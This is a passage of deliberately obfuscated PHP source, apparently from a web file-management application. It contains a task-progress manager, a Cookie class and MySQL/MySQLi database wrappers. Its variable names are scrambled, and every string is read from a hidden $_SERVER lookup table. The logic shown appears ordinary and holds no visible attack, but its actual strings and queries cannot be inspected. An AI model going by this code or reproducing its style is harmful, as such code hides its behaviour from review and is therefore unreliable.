$Òâˆû¬ı[1701] => 0, $Òâˆû¬ı[1702] => 0, $Òâˆû¬ı[1703] => 0, $Òâˆû¬ı[1704] => 0, $Òâˆû¬ı[790] => $Òâˆû¬ı[1652]); $GLOBALS[$Òâˆû¬ı[1705]] = 1; Hook::bind($Òâˆû¬ı[1656], array($this, $Òâˆû¬ı[1706])); Hook::bind($Òâˆû¬ı[1707], array($this, $Òâˆû¬ı[1708])); $this->startAfter(); Hook::trigger($Òâˆû¬ı[1709], $this->task); $this->task[$Òâˆû¬ı[1702]] = timeFloat(); } public function end($±‰¨Ì‚Ú = '') { $îòâğëí =& $_SERVER[èùÙ¹Ïö]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$îòâğëí[1702]]) { self::valueSet($this->task[$îòâğëí[445]], !1); } $this->isEnd = !0; if ($±‰¨Ì‚Ú) { $this->task[$îòâğëí[496]] = $±‰¨Ì‚Ú; } self::log($îòâğëí[1710] . $this->task[$îòâğëí[445]] . $îòâğëí[1711] . sprintf($îòâğëí[891], timeFloat() - $this->task[$îòâğëí[1700]]) . $îòâğëí[1712]); Hook::unbind($îòâğëí[1656], array($this, $îòâğëí[1706])); Hook::unbind($îòâğëí[1707], array($this, $îòâğëí[1708])); $this->endAfter(); $á¥ß¼¸ = $this->task; $this->task = !1; Hook::trigger($îòâğëí[1713], $á¥ß¼¸); } public function update($—–²ùÁ¤ = 0, $Å“×Èëğ = false) { $ªÑ˜›¼š =& $_SERVER[èùÙ¹Ïö]; $õšº€’ô =& $this->task; if (!$õšº€’ô) { return; } $õšº€’ô[$ªÑ˜›¼š[1697]] += $—–²ùÁ¤; $õšº€’ô[$ªÑ˜›¼š[1701]] = timeFloat(); if ($õšº€’ô[$ªÑ˜›¼š[826]]) { if ($õšº€’ô[$ªÑ˜›¼š[826]] < $õšº€’ô[$ªÑ˜›¼š[1697]]) { $õšº€’ô[$ªÑ˜›¼š[826]] = $õšº€’ô[$ªÑ˜›¼š[1697]]; } $Íû‡³ó = timeFloat() - $õšº€’ô[$ªÑ˜›¼š[1700]] - $õšº€’ô[$ªÑ˜›¼š[1703]]; if ($Íû‡³ó <= 0) { $Íû‡³ó = 0.001; } $õšº€’ô[$ªÑ˜›¼š[1698]] = $õšº€’ô[$ªÑ˜›¼š[1697]] / $õšº€’ô[$ªÑ˜›¼š[826]]; $õšº€’ô[$ªÑ˜›¼š[1699]] = $õšº€’ô[$ªÑ˜›¼š[1697]] / $Íû‡³ó; if ($õšº€’ô[$ªÑ˜›¼š[1698]] > 0) { $õšº€’ô[$ªÑ˜›¼š[1704]] = $Íû‡³ó * (1 - $õšº€’ô[$ªÑ˜›¼š[1698]]) / $õšº€’ô[$ªÑ˜›¼š[1698]]; } $õšº€’ô[$ªÑ˜›¼š[1704]] = $õšº€’ô[$ªÑ˜›¼š[1704]] <= 0 ? 0 : $õšº€’ô[$ªÑ˜›¼š[1704]]; } $this->updateAfter(); $ÚÑàò» = 0.2; if (timeFloat() - $õšº€’ô[$ªÑ˜›¼š[1702]] < $ÚÑàò» && !$Å“×Èëğ) { return; } $éÔ—çÓ = self::get($õšº€’ô[$ªÑ˜›¼š[445]]); $ëà¢èÍó = $éÔ—çÓ[$ªÑ˜›¼š[790]]; if ($ëà¢èÍó == self::STATYS_KILL) { $ã›ôü  = array($ªÑ˜›¼š[1714] => LNG($ªÑ˜›¼š[1715]), $ªÑ˜›¼š[1260] => !1); Cache::set($ªÑ˜›¼š[1716] . $this->task[$ªÑ˜›¼š[445]], $ã›ôü , 30); $this->onKill(); $this->end(); die; } else { if ($ëà¢èÍó == self::STATYS_STOP) { $×ì˜¯„ = 2; $éÔ—çÓ[$ªÑ˜›¼š[1703]] += $×ì˜¯„; self::valueSet($õšº€’ô[$ªÑ˜›¼š[445]], $éÔ—çÓ); sleep($×ì˜¯„); $this->update(); return; } } $õšº€’ô[$ªÑ˜›¼š[790]] = $ëà¢èÍó ? $ëà¢èÍó : $õšº€’ô[$ªÑ˜›¼š[790]]; $õšº€’ô[$ªÑ˜›¼š[1703]] = $éÔ—çÓ[$ªÑ˜›¼š[1703]] ? $éÔ—çÓ[$ªÑ˜›¼š[1703]] : 0; $õšº€’ô[$ªÑ˜›¼š[1702]] = timeFloat(); Hook::trigger($ªÑ˜›¼š[1717], $õšº€’ô); self::valueSet($õšº€’ô[$ªÑ˜›¼š[445]], $õšº€’ô); } public function onKillSet($æ²öÍ£ó, $‹’ø§¼æ = array()) { $this->onKillCall = array($æ²öÍ£ó, $‹’ø§¼æ); } public function onKill() { $²õ×šÊ =& $_SERVER[èùÙ¹Ïö]; self::log($²õ×šÊ[1710] . $this->task[$²õ×šÊ[445]] . $²õ×šÊ[1718]); Hook::trigger($²õ×šÊ[1719], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¿åĞ³Å) { $ƒİº‹Ê¢ =& $_SERVER[èùÙ¹Ïö]; Cache::set($ƒİº‹Ê¢[1716] . $this->task[$ƒİº‹Ê¢[445]], $¿åĞ³Å, 60); return $¿åĞ³Å; } public static function get($‹İÀ˜ôÔ) { $ğŒç¹õ =& $_SERVER[èùÙ¹Ïö]; $ÒğÒŒË³ = self::valueGet($‹İÀ˜ôÔ); if (is_array($ÒğÒŒË³) && $ÒğÒŒË³[$ğŒç¹õ[1720]]) { $“›åù“ = ActionApply($ÒğÒŒË³[$ğŒç¹õ[1720]], array($ÒğÒŒË³)); $ÒğÒŒË³ = is_array($“›åù“) ? $“›åù“ : $ÒğÒŒË³; } return $ÒğÒŒË³; } public static function listData() { $ŸêÀ¤âƒ = self::valueGet(); return array_sort_by($ŸêÀ¤âƒ, $_SERVER[èùÙ¹Ïö][1700], !0); } public static function kill($¸ÃÜµšÏ) { return self::changeStatus($¸ÃÜµšÏ, self::STATYS_KILL); } public static function stop($Ïîô¬³) { return self::changeStatus($Ïîô¬³, self::STATYS_STOP); } public static function restart($¥È“ŞÊ) { return self::changeStatus($¥È“ŞÊ, self::STATYS_RUNNING); } public static function killAll() { $Ï®ÕãåÈ =& $_SERVER[èùÙ¹Ïö]; $•Åà³íŠ = self::listData(); foreach ($•Åà³íŠ as $†›Çî›) { self::kill($†›Çî›[$Ï®ÕãåÈ[445]]); } sleep(2); foreach ($•Åà³íŠ as $†›Çî›) { self::valueSet($†›Çî›[$Ï®ÕãåÈ[445]], !1); } } private static function changeStatus($Ù÷öã‹ò, $ôÉœïìÍ) { $°·¿İåÙ =& $_SERVER[èùÙ¹Ïö]; $Ç¿€ê„ß = self::valueGet($Ù÷öã‹ò); if (!$Ç¿€ê„ß) { return !1; } $Ç¿€ê„ß[$°·¿İåÙ[790]] = $ôÉœïìÍ; self::valueSet($Ù÷öã‹ò, $Ç¿€ê„ß); self::log($°·¿İåÙ[1721] . $Ç¿€ê„ß[$°·¿İåÙ[445]] . $°·¿İåÙ[1722] . $ôÉœïìÍ); return !0; } public static function valueGet($È²µ§šñ = false) { $ôÔ·¼¼å =& $_SERVER[èùÙ¹Ïö]; if ($È²µ§šñ) { $Õıàô•è = Model($ôÔ·¼¼å[490])->where(array($ôÔ·¼¼å[96] => $È²µ§šñ, $ôÔ·¼¼å[33] => $ôÔ·¼¼å[1117]))->find(); return $Õıàô•è ? json_decode($Õıàô•è[$ôÔ·¼¼å[420]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($÷°³¤ú = false) { $€­Û¤šÚ =& $_SERVER[èùÙ¹Ïö]; $á”‚»»µ = array($€­Û¤šÚ[33] => $€­Û¤šÚ[1117]); if ($÷°³¤ú) { $á”‚»»µ[$€­Û¤šÚ[1696]] = $÷°³¤ú; } $ˆ·Õ™› = Model($€­Û¤šÚ[490])->where($á”‚»»µ)->select(); $ˆ·Õ™› = $ˆ·Õ™› ? $ˆ·Õ™› : array(); foreach ($ˆ·Õ™› as $êÈ¬óÌ± => $æóöôÑŒ) { $ˆ·Õ™›[$êÈ¬óÌ±] = json_decode($æóöôÑŒ[$€­Û¤šÚ[420]], !0); } return $ˆ·Õ™›; } public static function valueSet($Åàå€â, $ÉÛÇî˜¤) { $ÜÊ‡’¤Ø =& $_SERVER[èùÙ¹Ïö]; if (!$ÉÛÇî˜¤) { return Model($ÜÊ‡’¤Ø[490])->where(array($ÜÊ‡’¤Ø[96] => $Åàå€â, $ÜÊ‡’¤Ø[33] => $ÜÊ‡’¤Ø[1117]))->delete(); } $Š‚èõ±· = json_encode($ÉÛÇî˜¤); if (!$Š‚èõ±·) { ob_start(); var_dump($ÉÛÇî˜¤); $‚“¼¹Ê¡ = ob_get_clean(); self::log($ÜÊ‡’¤Ø[1723] . json_encode_force($‚“¼¹Ê¡)); } if (!$Åàå€â || !$ÉÛÇî˜¤[$ÜÊ‡’¤Ø[445]]) { return !1; } $÷İœ£÷” = array($ÜÊ‡’¤Ø[33] => $ÜÊ‡’¤Ø[1117], $ÜÊ‡’¤Ø[1696] => USER_ID, $ÜÊ‡’¤Ø[96] => $Åàå€â, $ÜÊ‡’¤Ø[420] => $Š‚èõ±·); $„ «» Š = $ÜÊ‡’¤Ø[1724]; CacheLock::lock($„ «» Š); Model($ÜÊ‡’¤Ø[490])->add($÷İœ£÷”, array(), !0); CacheLock::unlock($„ «» Š); } public static function log($œ‚æÑËª) { if (!GLOBAL_DEBUG) { return; } write_log($œ‚æÑËª, $_SERVER[èùÙ¹Ïö][1725]); } } goto C©î†ã­Øë; CĞš—¦ Ø¦: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¹¯µö·´ = '', $íÂç¸Ì• = 0) { if (is_string($¹¯µö·´) && $¹¯µö·´ != $_SERVER[èùÙ¹Ïö][12]) { $this->prefix = $¹¯µö·´; } if (is_numeric($íÂç¸Ì•) && $íÂç¸Ì• > 0) { $this->expire = $íÂç¸Ì•; } } public static function getInstance() { static $à¶¿ÚÉÌ; if ($à¶¿ÚÉÌ === null) { $à¶¿ÚÉÌ = new self(); } return $à¶¿ÚÉÌ; } private static $cookieDisable = false; public static function disable($ò±Ïòá¢) { self::$cookieDisable = $ò±Ïòá¢; } private static $sameCookieSet = array(); public static function set($Şìé«ÖÌ, $—”¹¥–©, $›¹±Õ = 0, $¾úµÁÈ = false, $ıÄ²ÆæÔ = false) { $·Ì˜ÚÜ =& $_SERVER[èùÙ¹Ïö]; if (self::$cookieDisable) { return; } if (!$›¹±Õ) { $›¹±Õ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Şìé«ÖÌ]) && self::$sameCookieSet[$Şìé«ÖÌ] == $—”¹¥–© . $›¹±Õ) { return; } self::$sameCookieSet[$Şìé«ÖÌ] = $—”¹¥–© . $›¹±Õ; if (!$ıÄ²ÆæÔ) { $ıÄ²ÆæÔ = str_replace(HOST, $·Ì˜ÚÜ[12], APP_HOST); $ıÄ²ÆæÔ = _get($GLOBALS, $·Ì˜ÚÜ[928], $ıÄ²ÆæÔ); } $Ä±®Ö = $·Ì˜ÚÜ[12]; setcookie($Şìé«ÖÌ, $—”¹¥–©, time() + $›¹±Õ, $·Ì˜ÚÜ[8] . trim($ıÄ²ÆæÔ, $·Ì˜ÚÜ[8]) . $Ä±®Ö, !1, !1, $¾úµÁÈ); } public static function setSafe($‰‹Â˜£ê, $Ï§‚”Î, $â™íÔÙù = 0) { self::set($‰‹Â˜£ê, $Ï§‚”Î, $â™íÔÙù, !0); } public static function get($±¶ÂÊ„ğ) { static $€ÚÆƒüÍ = false; if (!$€ÚÆƒüÍ) { self::initHeaderCookie(); $€ÚÆƒüÍ = !0; } return isset($_COOKIE[$±¶ÂÊ„ğ]) ? $_COOKIE[$±¶ÂÊ„ğ] : !1; } private static function initHeaderCookie() { $¤‚×ª‹¶ =& $_SERVER[èùÙ¹Ïö]; if (!isset($_SERVER[$¤‚×ª‹¶[929]]) || !$_SERVER[$¤‚×ª‹¶[929]]) { return; } $ŒÜ£ÔòÆ = explode($¤‚×ª‹¶[73], $_SERVER[$¤‚×ª‹¶[929]]); foreach ($ŒÜ£ÔòÆ as $¶ó®¦Ë) { $¶ó®¦Ë = explode($¤‚×ª‹¶[930], $¶ó®¦Ë); if (count($¶ó®¦Ë) != 2 || !isset($¶ó®¦Ë[1])) { continue; } $_COOKIE[trim($¶ó®¦Ë[0])] = trim($¶ó®¦Ë[1]); } } public static function remove($­û‹©Á, $ë¡šõø› = false) { unset($_COOKIE[$­û‹©Á]); self::set($­û‹©Á, $_SERVER[èùÙ¹Ïö][12], 1, $ë¡šõø›); } } class DbMysql extends Db { public function __construct($¥“¨¼Ø = '') { $ Ó‡±û =& $_SERVER[èùÙ¹Ïö]; if (!extension_loaded($ Ó‡±û[844])) { think_exception(think_lang($ Ó‡±û[14]) . $ Ó‡±û[931]); } if (!empty($¥“¨¼Ø)) { $this->config = $¥“¨¼Ø; if (empty($this->config[$ Ó‡±û[17]])) { $this->config[$ Ó‡±û[17]] = $ Ó‡±û[12]; } } } public function connect($ÔÈéÚï = '', $ó·ìüœ¬ = 0, $óŞ¾çÂÄ = false) { $Ø¡ëúª½ =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->linkID[$ó·ìüœ¬])) { if (empty($ÔÈéÚï)) { $ÔÈéÚï = $this->config; } $ ª ·Ø„ = $ÔÈéÚï[$Ø¡ëúª½[932]] . ($ÔÈéÚï[$Ø¡ëúª½[933]] ? "\72{$ÔÈéÚï[$Ø¡ëúª½[933]]}" : $Ø¡ëúª½[12]); $÷¿Û…ú¶ = !empty($ÔÈéÚï[$Ø¡ëúª½[17]][$Ø¡ëúª½[18]]) ? $ÔÈéÚï[$Ø¡ëúª½[17]][$Ø¡ëúª½[18]] : $this->pconnect; if ($÷¿Û…ú¶) { $this->linkID[$ó·ìüœ¬] = mysql_pconnect($ ª ·Ø„, $ÔÈéÚï[$Ø¡ëúª½[934]], $ÔÈéÚï[$Ø¡ëúª½[935]], 131072); } else { $this->linkID[$ó·ìüœ¬] = mysql_connect($ ª ·Ø„, $ÔÈéÚï[$Ø¡ëúª½[934]], $ÔÈéÚï[$Ø¡ëúª½[935]], !0, 131072); } if (!$this->linkID[$ó·ìüœ¬] || !empty($ÔÈéÚï[$Ø¡ëúª½[21]]) && !mysql_select_db($ÔÈéÚï[$Ø¡ëúª½[21]], $this->linkID[$ó·ìüœ¬])) { think_exception(mysql_error()); } $ÂÇ…²æ = mysql_get_server_info($this->linkID[$ó·ìüœ¬]); mysql_query($Ø¡ëúª½[936] . think_config($Ø¡ëúª½[937]) . $Ø¡ëúª½[58], $this->linkID[$ó·ìüœ¬]); if ($ÂÇ…²æ > $Ø¡ëúª½[938]) { mysql_query($Ø¡ëúª½[939], $this->linkID[$ó·ìüœ¬]); } $this->connected = !0; if (1 != think_config($Ø¡ëúª½[22])) { unset($this->config); } } return $this->linkID[$ó·ìüœ¬]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ƒ¢È ı¯) { $éÜ²Ú³‰ =& $_SERVER[èùÙ¹Ïö]; if (0 === stripos($ƒ¢È ı¯, $éÜ²Ú³‰[310])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ¢È ı¯; if ($this->queryID) { $this->free(); } think_action_status($éÜ²Ú³‰[23], 1); think_status($éÜ²Ú³‰[24]); $this->queryID = mysql_query($ƒ¢È ı¯, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Î¦¨ÙÑÄ) { $Ê¤½°šô =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Î¦¨ÙÑÄ; if ($this->queryID) { $this->free(); } think_action_status($Ê¤½°šô[25], 1); think_status($Ê¤½°šô[24]); $’€œì°Ú = mysql_query($Î¦¨ÙÑÄ, $this->_linkID); $this->debug(); if (!1 === $’€œì°Ú) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[èùÙ¹Ïö][940], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $™àˆ‰ÍĞ = mysql_query($_SERVER[èùÙ¹Ïö][941], $this->_linkID); $this->transTimes = 0; if (!$™àˆ‰ÍĞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¤´‹©ğ = mysql_query($_SERVER[èùÙ¹Ïö][942], $this->_linkID); $this->transTimes = 0; if (!$¤´‹©ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÊÍöÁËÑ = array(); if ($this->numRows > 0) { while ($Í¸è”—ª = mysql_fetch_assoc($this->queryID)) { $ÊÍöÁËÑ[] = $Í¸è”—ª; } mysql_data_seek($this->queryID, 0); } return $ÊÍöÁËÑ; } public function getFields($¸ˆ®ª±À) { $¶šÄ ’Ç =& $_SERVER[èùÙ¹Ïö]; $—²œÍ¬² = $this->query($¶šÄ ’Ç[943] . $this->parseKey($¸ˆ®ª±À)); $¥ÙËíò = array(); if ($—²œÍ¬²) { foreach ($—²œÍ¬² as $š¡¯˜… => $×ÌÚô‹ü) { $¥ÙËíò[$×ÌÚô‹ü[$¶šÄ ’Ç[31]]] = array($¶šÄ ’Ç[32] => $×ÌÚô‹ü[$¶šÄ ’Ç[31]], $¶šÄ ’Ç[33] => $×ÌÚô‹ü[$¶šÄ ’Ç[34]], $¶šÄ ’Ç[35] => (bool) (strtoupper($×ÌÚô‹ü[$¶šÄ ’Ç[36]]) === $¶šÄ ’Ç[944]), $¶šÄ ’Ç[37] => $×ÌÚô‹ü[$¶šÄ ’Ç[38]], $¶šÄ ’Ç[39] => strtolower($×ÌÚô‹ü[$¶šÄ ’Ç[40]]) == $¶šÄ ’Ç[41], $¶šÄ ’Ç[42] => strtolower($×ÌÚô‹ü[$¶šÄ ’Ç[43]]) == $¶šÄ ’Ç[44]); } } return $¥ÙËíò; } public function getTables($åöìÛªÜ = '') { $õ·»¦´¥ =& $_SERVER[èùÙ¹Ïö]; if (!empty($åöìÛªÜ)) { $à¸Ù¼‹¿ = $õ·»¦´¥[945] . $åöìÛªÜ . $õ·»¦´¥[946]; } else { $à¸Ù¼‹¿ = $õ·»¦´¥[947]; } $ƒÆ¥·³ = $this->query($à¸Ù¼‹¿); $õ÷¨ìôé = array(); foreach ($ƒÆ¥·³ as $ÅÆí„ŸÎ => $¢İååêà) { $õ÷¨ìôé[$ÅÆí„ŸÎ] = current($¢İååêà); } return $õ÷¨ìôé; } public function replace($ç…Áìç“, $”ÏšÃâ = array()) { $­Ç²Ş† =& $_SERVER[èùÙ¹Ïö]; foreach ($ç…Áìç“ as $Å„œç® => $ŒØğ•­) { $ŸğïÒ‚ = $this->parseValue($ŒØğ•­); if (is_scalar($ŸğïÒ‚)) { $åŞÜ Şô[] = $ŸğïÒ‚; $ÄÂºóÎÉ[] = $this->parseKey($Å„œç®); } } $ïÃ³¹«¸ = $­Ç²Ş†[948] . $this->parseTable($”ÏšÃâ[$­Ç²Ş†[325]]) . $­Ç²Ş†[949] . implode($­Ç²Ş†[50], $ÄÂºóÎÉ) . $­Ç²Ş†[950] . implode($­Ç²Ş†[50], $åŞÜ Şô) . $­Ç²Ş†[951]; return $this->execute($ïÃ³¹«¸); } public function insertAll($ü‡õŒºË, $ºÚßÁÙ” = array(), $¨êş½Â‰ = false) { $ÇÎ±ìÀ =& $_SERVER[èùÙ¹Ïö]; if (!is_array($ü‡õŒºË[0])) { return !1; } $¤ØĞ°Èù = array_keys($ü‡õŒºË[0]); $­ÖŞóÍ² = array(); foreach ($ü‡õŒºË as $ãİø¨½Ü) { $ÜÒ•”¼µ = array(); foreach ($ãİø¨½Ü as $«ªØ›¢Ú => $âÓ—‹‹€) { $âÓ—‹‹€ = $this->parseValue($âÓ—‹‹€); if (is_scalar($âÓ—‹‹€)) { $ÜÒ•”¼µ[] = $âÓ—‹‹€; } } $­ÖŞóÍ²[] = $ÇÎ±ìÀ[306] . implode($ÇÎ±ìÀ[50], $ÜÒ•”¼µ) . $ÇÎ±ìÀ[951]; } array_walk($¤ØĞ°Èù, array($this, $ÇÎ±ìÀ[952])); $‰Ú×Ğ–Û = ($¨êş½Â‰ ? $ÇÎ±ìÀ[953] : $ÇÎ±ìÀ[954]) . $ÇÎ±ìÀ[955] . $this->parseTable($ºÚßÁÙ”[$ÇÎ±ìÀ[325]]) . $ÇÎ±ìÀ[949] . implode($ÇÎ±ìÀ[50], $¤ØĞ°Èù) . $ÇÎ±ìÀ[956] . implode($ÇÎ±ìÀ[50], $­ÖŞóÍ²); return $this->execute($‰Ú×Ğ–Û); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ñ¹µë£ë =& $_SERVER[èùÙ¹Ïö]; $this->error = mysql_errno() . $ñ¹µë£ë[4] . mysql_error($this->_linkID); if ($ñ¹µë£ë[12] != $this->queryStr) { $this->error .= LNG($ñ¹µë£ë[48]) . $this->queryStr; } think_trace($this->error, $ñ¹µë£ë[12], $ñ¹µë£ë[49]); return $this->error; } public function escapeString($Ÿ»øıÁõ) { if ($this->_linkID) { return mysql_real_escape_string($Ÿ»øıÁõ, $this->_linkID); } else { return mysql_escape_string($Ÿ»øıÁõ); } } public function parseKey(&$µÜä¼›, $ïÇâââ = true) { $şèÍÎÍ˜ =& $_SERVER[èùÙ¹Ïö]; if ($ïÇâââ) { $µÜä¼› = $this->parseKeyCheck($µÜä¼›); } if ($µÜä¼› != $şèÍÎÍ˜[205] && !preg_match($şèÍÎÍ˜[957], $µÜä¼›)) { $µÜä¼› = $şèÍÎÍ˜[431] . trim($µÜä¼›, $şèÍÎÍ˜[431]) . $şèÍÎÍ˜[431]; } return $µÜä¼›; } } class DbMysqli extends Db { public function __construct($¨öúõë = '') { $àö®­õ =& $_SERVER[èùÙ¹Ïö]; if (!extension_loaded($àö®­õ[958])) { think_exception(think_lang($àö®­õ[14]) . $àö®­õ[959]); } if (!empty($¨öúõë)) { $this->config = $¨öúõë; if (empty($this->config[$àö®­õ[17]])) { $this->config[$àö®­õ[17]] = $àö®­õ[12]; } } } public function connect($«ÉëÂÅÆ = '', $±•õç¼ = 0) { $˜úùØø‚ =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->linkID[$±•õç¼])) { if (empty($«ÉëÂÅÆ)) { $«ÉëÂÅÆ = $this->config; } $this->linkID[$±•õç¼] = new mysqli($«ÉëÂÅÆ[$˜úùØø‚[932]], $«ÉëÂÅÆ[$˜úùØø‚[934]], $«ÉëÂÅÆ[$˜úùØø‚[935]], $«ÉëÂÅÆ[$˜úùØø‚[21]], $«ÉëÂÅÆ[$˜úùØø‚[933]] ? intval($«ÉëÂÅÆ[$˜úùØø‚[933]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $øªÔÜµß = $this->linkID[$±•õç¼]->server_version; $this->linkID[$±•õç¼]->query($˜úùØø‚[936] . think_config($˜úùØø‚[937]) . $˜úùØø‚[58]); if ($øªÔÜµß > $˜úùØø‚[938]) { $this->linkID[$±•õç¼]->query($˜úùØø‚[939]); } $this->connected = !0; if (1 != think_config($˜úùØø‚[22])) { unset($this->config); } } return $this->linkID[$±•õç¼]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($£õÁìå) { $¾±ƒö€° =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $£õÁìå; if ($this->queryID) { $this->free(); } think_action_status($¾±ƒö€°[23], 1); think_status($¾±ƒö€°[24]); $this->queryID = $this->_linkID->query($£õÁìå); if ($this->_linkID->more_results()) { while (($ƒ¼¦ø…½ = $this->_linkID->next_result()) != NULL) { $ƒ¼¦ø…½->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÛÌ›™) { $¸¯Ûî“€ =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÌ›™; if ($this->queryID) { $this->free(); } think_action_status($¸¯Ûî“€[25], 1); think_status($¸¯Ûî“€[24]); $³ñ¤Âô½ = $this->_linkID->query($ÛÌ›™); $this->debug(); if (!1 === $³ñ¤Âô½) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÙßÅ¡ã± = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÙßÅ¡ã±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $á¸Ïƒæİ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$á¸Ïƒæİ) { $this->error(); return !1; } } return !0; } private function getAll() { $ˆÀ¾õ‹« = array(); if ($this->numRows > 0) { for ($ş×™—“û = 0; $ş×™—“û < $this->numRows; $ş×™—“û++) { $ˆÀ¾õ‹«[$ş×™—“û] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ˆÀ¾õ‹«; } public function getFields($“†×ŠÏÇ) { $’ôõúÖ =& $_SERVER[èùÙ¹Ïö]; $ÀÄ£… = $this->query($’ôõúÖ[943] . $this->parseKey($“†×ŠÏÇ)); $ÉÚ¶í³á = array(); if ($ÀÄ£…) { foreach ($ÀÄ£… as $¹ç¨óüˆ => $ÀãÉÚ¨û) { $ÉÚ¶í³á[$ÀãÉÚ¨û[$’ôõúÖ[31]]] = array($’ôõúÖ[32] => $ÀãÉÚ¨û[$’ôõúÖ[31]], $’ôõúÖ[33] => $ÀãÉÚ¨û[$’ôõúÖ[34]], $’ôõúÖ[35] => (bool) ($ÀãÉÚ¨û[$’ôõúÖ[36]] === $’ôõúÖ[12]), $’ôõúÖ[37] => $ÀãÉÚ¨û[$’ôõúÖ[38]], $’ôõúÖ[39] => strtolower($ÀãÉÚ¨û[$’ôõúÖ[40]]) == $’ôõúÖ[41], $’ôõúÖ[42] => strtolower($ÀãÉÚ¨û[$’ôõúÖ[43]]) == $’ôõúÖ[44]); } } return $ÉÚ¶í³á; } public function getTables($ßĞØï…ú = '') { $±îçÜÓè =& $_SERVER[èùÙ¹Ïö]; $Ìä„¶Æ = !empty($ßĞØï…ú) ? $±îçÜÓè[945] . $ßĞØï…ú . $±îçÜÓè[946] : $±îçÜÓè[947]; $ìûÖ¤å = $this->query($Ìä„¶Æ); $ÌûìÓ›€ = array(); if ($ìûÖ¤å) { foreach ($ìûÖ¤å as $ÙŞğë† => $Çö­£·) { $ÌûìÓ›€[$ÙŞğë†] = current($Çö­£·); } } return $ÌûìÓ›€; } public function replace($÷³™Ø–¸, $ÙÓ±¿õã = array()) { $’½¸À™¥ =& $_SERVER[èùÙ¹Ïö]; foreach ($÷³™Ø–¸ as $ª……ä¯â => $ºÕ‹”Îì) { $•ûØÕ®Ş = $this->parseValue($ºÕ‹”Îì); if (is_scalar($•ûØÕ®Ş)) { $ÈÅš£Õï[] = $•ûØÕ®Ş; $¥™«‡[] = $this->parseKey($ª……ä¯â); } } $ßâûáøÔ = $’½¸À™¥[948] . $this->parseTable($ÙÓ±¿õã[$’½¸À™¥[325]]) . $’½¸À™¥[949] . implode($’½¸À™¥[50], $¥™«‡) . $’½¸À™¥[950] . implode($’½¸À™¥[50], $ÈÅš£Õï) . $’½¸À™¥[951]; return $this->execute($ßâûáøÔ); } public function insertAll($Óè»î¢é, $ší€´ª× = array(), $º¨¼¡ºØ = false) { $‘¤ğ’Òä =& $_SERVER[èùÙ¹Ïö]; if (!is_array($Óè»î¢é[0])) { return !1; } $„úâ¦ê = array_keys($Óè»î¢é[0]); $¨æ¼îÏâ = array(); foreach ($Óè»î¢é as $ı”í¦ú‡) { $›°ŒÇ‡Æ = array(); foreach ($ı”í¦ú‡ as $¢®éñà => $úÙÛŸ©ş) { $úÙÛŸ©ş = $this->parseValue($úÙÛŸ©ş); if (is_scalar($úÙÛŸ©ş)) { $›°ŒÇ‡Æ[] = $úÙÛŸ©ş; } } $¨æ¼îÏâ[] = $‘¤ğ’Òä[306] . implode($‘¤ğ’Òä[50], $›°ŒÇ‡Æ) . $‘¤ğ’Òä[951]; } array_walk($„úâ¦ê, array($this, $‘¤ğ’Òä[952])); $’¾ßà´Œ = $º¨¼¡ºØ ? $‘¤ğ’Òä[953] : $‘¤ğ’Òä[954]; $¡«“õ±Ë = $’¾ßà´Œ . $‘¤ğ’Òä[955] . $this->parseTable($ší€´ª×[$‘¤ğ’Òä[325]]) . $‘¤ğ’Òä[949] . implode($‘¤ğ’Òä[50], $„úâ¦ê) . $‘¤ğ’Òä[956] . implode($‘¤ğ’Òä[50], $¨æ¼îÏâ); return $this->execute($¡«“õ±Ë); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÒéâÊ‰Ë =& $_SERVER[èùÙ¹Ïö]; $this->error = $this->_linkID->errno . $ÒéâÊ‰Ë[4] . $this->_linkID->error; if ($ÒéâÊ‰Ë[12] != $this->queryStr) { $this->error .= LNG($ÒéâÊ‰Ë[48]) . $this->queryStr; } think_trace($this->error, $ÒéâÊ‰Ë[12], 